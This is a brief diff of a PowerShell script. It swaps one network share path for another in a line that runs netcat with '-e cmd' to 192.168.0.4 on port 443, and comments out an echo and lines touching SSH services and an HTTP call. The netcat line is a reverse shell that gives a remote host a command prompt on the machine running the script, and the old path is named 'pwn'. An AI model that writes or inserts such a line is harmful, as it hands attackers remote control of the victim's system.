@@ -13,8 +13,8 @@ function Main
     #Get-Service -Name *ssh* | Set-Service -StartupType Automatic;
     #Invoke-RestMethod -Uri 'http://192.168.0.3:8080'
 
-    echo "Hello world"
+    #echo "Hello world"
 
-    cmd /c \\192.168.0.4\pwn\nc.exe -e cmd 192.168.0.4 443
+    cmd /c \\192.168.0.4\gualdronsito\netcat\nc.exe -e cmd 192.168.0.4 443
 }
 Main
